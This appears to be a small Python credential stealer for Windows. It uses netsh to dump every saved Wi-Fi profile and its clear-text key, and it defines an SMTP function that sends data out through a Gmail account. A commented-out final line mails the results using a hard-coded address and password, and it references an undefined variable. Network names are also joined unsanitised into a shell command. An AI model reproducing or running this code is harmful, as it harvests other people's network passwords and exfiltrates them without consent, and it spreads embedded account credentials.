import smtplib,subprocess,re


def sendMail(email,password,message):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def getWifi():
    wifiNetworks = []
    wlanProfile = 'netsh wlan show profile'
    wlanProfile = subprocess.check_output(wlanProfile,shell=True)
    wlanProfile = wlanProfile.decode()
    #print(wlanProfile)
    if 'Profile' in str(wlanProfile):
        netNames = re.compile('(Profile\s*:\s)(.*)')
        netNames = re.findall(netNames,str(wlanProfile))
        for profile in netNames:
            
            wifiNet = profile[1].strip()
            #print(wifiNet)
            wifiNetworks.append(wifiNet)
            
        
    return wifiNetworks

#print(getWifi())
def getPass():
    passwords = {}

    for network in getWifi():
        #print(network)
        cmd = 'netsh wlan show profile ' + network + ' key=clear'
        wlanProfile = subprocess.check_output(cmd)
        wlanProfile = wlanProfile.decode()
        if 'Key Content' in wlanProfile:
            #print(cmd)
            #print(wlanProfile)
            getNet = re.compile(r'SSID name\s*:\s(".*")')
            getPass = re.compile(r'Key Content\s*:\s(.*)')
            network = getNet.findall(wlanProfile)
            password = getPass.findall(wlanProfile)
            network = network[0].strip()
            password = password[0].strip()
            #print(network)
            #print(password)
            passwords[network] = password
            
            

    return passwords
print(getPass())
#sendMail('benpro4433@gmail.com','burn3rp4ss',result)

